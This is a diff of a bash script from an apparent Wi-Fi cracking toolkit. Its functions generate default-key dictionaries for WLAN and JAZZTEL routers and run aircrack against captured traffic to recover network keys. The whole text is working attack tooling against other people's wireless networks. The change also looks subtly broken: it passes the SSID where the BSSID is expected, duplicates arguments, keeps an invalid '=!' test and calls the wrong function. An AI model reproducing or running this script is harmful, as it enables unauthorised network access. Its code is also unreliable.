@@ -19,31 +19,31 @@
 
 doitwld(){
     echo "Cracking WLAN"; sleep 2
-	execute $WLD $Host_MAC $Host_SSID $DUMP_PATH/wlddic 
-	execute $AIRCRACK -b $Host_MAC -w $DUMP_PATH/wlddic $DUMP_PATH/$Host_MAC-01.cap
+	execute $WLD $Host_SSID $Host_SSID $DUMP_PATH/wlddic 
+	execute $AIRCRACK -b $Host_SSID -w $DUMP_PATH/wlddic $DUMP_PATH/$Host_SSID-01.cap
 }
 
 doitjt(){
     echo "Cracking Jazztel"; sleep 2
-	execute $JTD $Host_MAC $Host_SSID $DUMP_PATH/jtddic
-	execute $AIRCRACK  -b $Host_MAC -w $DUMP_PATH/jtddic $DUMP_PATH/$Host_MAC-01.cap
+	execute $JTD $Host_SSID $Host_SSID $DUMP_PATH/jtddic
+	execute $AIRCRACK  -b $Host_SSID -w $DUMP_PATH/jtddic $DUMP_PATH/$Host_SSID-01.cap
 }
 
 wld(){
     echo "WLAN"
-    if [ "$Host_MAC" == "" ]; then clear; echo -e "gettext `'Error: You must select a client before performing this attack'`\n"; fi
-    if [[ "$Host_MAC" =~ "WLAN(.*)" ]]; then
+    if [ "$Host_SSID" == "" ]; then clear; echo -e "gettext `'Error: You must select a client before performing this attack'`\n"; fi
+    if [[ "$Host_SSID" =~ WLAN* ]]; then
         if [ -e $DUMP_PATH/$Host_MAC-01.cap ]; then doitjtd
         else echo "`gettext 'No capture file. Capture some ivs'`"; fi
     else
-        _ "Cant crack this network with this dictionary"
+        _ "Cant crack this network with this dictionary $Host_SSID"
     fi
 }
 
 jtd(){
     echo "JAZZTEL"
-    if [ "$Host_MAC" == "" ]; then clear; echo -e "gettext `'Error: You must select a client before performing this attack'`\n"; fi
-    if [[ "$Host_MAC" =~ "JAZZTEL(.*)" ]]; then
+    if [ "$Host_SSID" == "" ]; then clear; echo -e "gettext `'Error: You must select a client before performing this attack'`\n"; fi
+    if [[ "$Host_SSID" =~ JAZZTEL* ]]; then
         if [ -e $DUMP_PATH/$Host_MAC-01.cap ]; then doitjtd
         else echo "`gettext 'No capture file. Capture some ivs'`"; fi
     else
@@ -52,7 +52,7 @@ jtd(){
 }
 
 auto(){
-    $AIROSCWORDLIST $DUMP_PATH/$Host_MAC.dic $CMPFILE $Host_SSID $Host_MAC;
-    if [ $? =! "404" ]; then $AIRCRACK -f $DUMP_PATH/$Host_MAC.key -b $Host_MAC -w $DUMP_PATH/$Host_MAC.dic $DUMP_PATH/$Host_MAC*.cap; fi
+    $AIROSCWORDLIST $DUMP_PATH/$Host_SSID.dic $CMPFILE $Host_SSID $Host_SSID;
+    if [ $? =! "404" ]; then $AIRCRACK -f $DUMP_PATH/$Host_SSID.key -b $Host_SSID -w $DUMP_PATH/$Host_SSID.dic $DUMP_PATH/$Host_SSID*.cap; fi
         if [ $? == "404" ]; then crack; fi
 }
